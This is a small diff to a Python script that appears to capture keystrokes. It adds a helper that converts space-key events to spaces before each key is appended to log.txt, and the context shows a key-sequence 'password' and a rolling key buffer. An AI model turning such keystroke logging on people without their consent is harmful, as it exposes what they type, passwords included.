@@ -5,9 +5,18 @@ password = ["s", "q", "Key.space", "'", "-", "Key.space" ]
 keys = deque(maxlen=6)
 
 
+def formatKey(key):
+    if '<Key.space>' in key:
+        return ' '
+    else:
+        return key
+
+        
+
+
 def log(text):
     with open("log.txt", "a") as file_log:
-        file_log.write(text)
+        file_log.write(formatKey(text))
 
 
 def screen(key):
